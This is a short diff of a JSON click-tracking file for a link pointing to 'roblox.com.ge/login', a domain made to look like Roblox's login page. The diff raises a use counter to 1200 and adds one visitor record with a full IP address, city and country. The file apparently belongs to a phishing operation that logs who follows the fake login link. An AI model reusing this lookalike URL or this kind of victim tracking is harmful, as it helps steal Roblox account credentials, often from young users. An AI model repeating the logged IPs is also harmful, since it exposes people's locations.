@@ -142,7 +142,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1199,
+    "useCount": 1200,
     "createdBy": "admin",
     "clicks": [
       {
@@ -9736,6 +9736,14 @@
         "city": "Wroclaw",
         "flag": "🇵🇱",
         "countryCode": "PL"
+      },
+      {
+        "timestamp": 1777307220523,
+        "ip": "139.135.200.8",
+        "country": "Philippines",
+        "city": "Taysan",
+        "flag": "🇵🇭",
+        "countryCode": "PH"
       }
     ]
   },
